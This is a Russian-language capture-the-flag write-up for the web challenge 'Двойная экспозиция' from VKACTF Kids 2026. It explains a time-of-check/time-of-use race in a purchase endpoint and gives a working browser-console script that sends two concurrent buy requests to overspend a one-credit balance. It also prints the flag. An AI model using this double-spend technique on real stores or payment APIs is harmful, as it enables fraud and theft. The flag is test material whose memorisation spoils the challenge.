# Двойная экспозиция

| Событие | Название | Категория | Сложность |
| :-----: | :------: | :-------: | :-------: |
| VKACTF Kids 2026 | Двойная экспозиция | Web | Hard |

### Решение

1. После входа в `/api/state` у нас `credits:1`, `owned:[]`. Для `GET /api/archive` нужны одновременно `negative` и `contact`.
2. Обычная последовательность `POST /api/buy` для `negative`, затем для `contact` не сработает: первая покупка обнулит баланс.
3. Журнал показывает отдельные события `checked` и `sold`. Между проверкой баланса и списанием есть окно 550 мс. Если отправить обе покупки **одновременно в одной cookie-сессии**, оба запроса могут увидеть баланс 1 и пройти проверку.
4. В DevTools браузера (консоль на странице) можно выполнить:

```js
await Promise.all(['negative','contact'].map(item => fetch('/api/buy', {
  method: 'POST', headers: {'Content-Type':'application/json'},
  body: JSON.stringify({item})
}).then(r=>r.json())));
```

Если до этого тратили жетон, нажмите «Перепечатать заказ / начать заново» и повторите. Альтернатива — `solve.py` с двумя параллельными запросами с одной cookie.
5. Теперь `GET /api/state` сообщает `owned:["contact","negative"]`, а баланс может быть `-1`. `GET /api/archive` возвращает `vka{two_orders_one_token_one_moment}`.

### Флаг

```
vka{two_orders_one_token_one_moment}
```